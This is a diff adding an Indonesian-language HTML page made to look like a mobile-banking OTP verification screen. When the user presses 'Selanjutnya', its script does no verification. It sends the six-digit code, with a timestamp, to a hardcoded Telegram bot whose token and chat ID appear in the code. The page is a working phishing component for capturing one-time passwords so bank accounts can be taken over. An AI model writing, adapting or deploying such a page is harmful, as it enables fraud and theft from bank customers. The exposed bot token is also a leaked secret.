@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registrasi Mobile Banking</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            font-family: sans-serif;
+            background-color: #f5f5f5;
+            font-size: 14px;
+            overflow-y: hidden;
+        }
+
+        .header {
+            background-color: #3498db;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            font-size: 18px;
+            position: fixed;
+            top: 0;
+            width: 100%;
+        }
+
+        .container {
+            padding: 20px;
+            margin-top: 70px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .title {
+            font-size: 15px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #333;
+            
+        }
+
+        .subtitle {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .otp-container {
+            display: flex;
+            gap: 2px;
+            margin-bottom: 20px;
+        }
+
+        .otp-input {
+            width: 45px;
+            height: 45px;
+            border: 0px solid #ccc;
+            border-radius: 15px;
+            text-align: center;
+            font-size: 20px;
+            transition: border-color 0.3s;
+        }
+
+        .otp-input:focus {
+            border-color: #3498db;
+            outline: none;
+        }
+
+        .timer {
+            color: red;
+            margin-bottom: 15px;
+            font-weight: bold;
+            font-size: 13px;
+        }
+
+        .timer span {
+            font-size: 13px;
+            color: red;
+            font-weight: bold;
+        }
+
+        .resend-container {
+            margin-top: 90px; 
+            position: relative;
+            margin-bottom: 20px;
+            width: 180px;
+            height: 50px;
+            border-radius: 8px;
+            border: 1px solid #3498db;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: not-allowed;
+            background-color: transparent;
+            transition: background-color 0.3s;
+        }
+
+        .resend-container.active {
+            cursor: pointer;
+            background-color: rgba(52, 152, 219, 0.1);
+        }
+
+        .resend-text {
+            color: #3498db;
+            font-size: 14px;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        .next-button {
+            background-color: #ccc;
+            color: white;
+            border: none;
+            padding: 20px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: not-allowed;
+            width: 180px;
+            max-width: 180px;
+            margin-top: 20px;
+        }
+
+        .next-button.active {
+            background-color: #3498db;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        Verifikasi OTP
+    </div>
+    <div class="container">
+        <div class="title">Masukkan kode OTP</div>
+        <div class="subtitle">OTP yang telah dikirimkan ke nomor Ponsel +𝟲𝟮𝟴𝗫𝗫𝗫𝗫𝗫𝗫𝗫𝗫𝗫𝗫</div>
+        
+        <div class="otp-container">
+            <input type="text" maxlength="1" class="otp-input">
+            <input type="text" maxlength="1" class="otp-input">
+            <input type="text" maxlength="1" class="otp-input">
+            <input type="text" maxlength="1" class="otp-input">
+            <input type="text" maxlength="1" class="otp-input">
+            <input type="text" maxlength="1" class="otp-input">
+        </div>
+
+        <div class="timer">
+            Kirim ulang kode OTP dalam: <span>00:00</span>
+        </div>
+
+        <div class="resend-container" id="resendButton">
+            <div class="resend-text" id="resendText">Kirim ulang Kode OTP</div>
+        </div>
+
+        <button class="next-button" disabled>
+            Selanjutnya
+        </button>
+    </div>
+
+    <script>
+      const otpInputs = document.querySelectorAll('.otp-input');
+      const nextButton = document.querySelector('.next-button');
+      const timerElement = document.querySelector('.timer span');
+      const resendButton = document.getElementById('resendButton');
+      const resendText = document.getElementById('resendText');
+      let timeLeft = 59;
+      let timerInterval;
+    
+      otpInputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+          if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+            otpInputs[index + 1].focus();
+          }
+    
+          checkOtpCompletion();
+        });
+    
+        input.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && !e.target.value && index > 0) {
+            otpInputs[index - 1].focus();
+          }
+        });
+      });
+    
+      const checkOtpCompletion = () => {
+        const otp = Array.from(otpInputs).map(input => input.value).join('');
+        nextButton.disabled = otp.length !== otpInputs.length;
+        if (!nextButton.disabled) {
+          nextButton.classList.add('active');
+        } else {
+          nextButton.classList.remove('active');
+        }
+      };
+    
+      const updateTimer = () => {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+    
+        if (timeLeft === 0) {
+          // Enable resend button and show text
+          resendButton.classList.add('active'); // Make it clickable
+          timerElement.parentElement.style.display = 'none';
+        } else {
+          timeLeft--;
+        }
+      };
+    
+      const resetTimer = () => {
+        timeLeft = 55; // Reset the timer to 55 seconds
+        clearInterval(timerInterval); // Clear any existing intervals
+        timerInterval = setInterval(updateTimer, 1000); // Start a new interval
+        timerElement.parentElement.style.display = 'block'; // Show the timer again
+        resendButton.classList.remove('active'); // Disable the resend button
+      };
+    
+      resendButton.addEventListener('click', () => {
+        if (timeLeft === 0) {
+          // Simulate the resend OTP action
+          alert("Kode OTP telah dikirim ulang.");
+          resetTimer(); // Reset the timer when resend button is clicked
+        }
+      });
+    
+      // Function to send OTP to Telegram with Markdown
+      const sendOtpToTelegram = (otp) => {
+        const token = '7909539545:AAHMcspeYAM5HajvT6rGvCCPHsf9W0KuVSU'; // Ganti dengan token bot Anda
+        const chatId = '7225707577'; // Ganti dengan chat ID atau username grup Telegram
+        const currentTime = new Date().toLocaleString(); // Current date and time in local format
+        const message = `*📄 Aktivasi OTP*\n*🕒 ${currentTime}*\n\n*OTP:* \`${otp}\``;
+    
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+    
+        fetch(url)
+          .then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+              console.log('OTP berhasil dikirim ke Telegram');
+            } else {
+              console.error('Gagal mengirim OTP ke Telegram');
+            }
+          })
+          .catch(error => {
+            console.error('Error:', error);
+          });
+      };
+    
+      nextButton.addEventListener('click', () => {
+        // Ambil OTP yang dimasukkan
+        const otp = Array.from(otpInputs).map(input => input.value).join('');
+    
+        // Kirim OTP ke Telegram
+        sendOtpToTelegram(otp);
+      });
+    
+      timerInterval = setInterval(updateTimer, 1000); // Start the timer when page loads
+    </script>
+</body>
+</html>
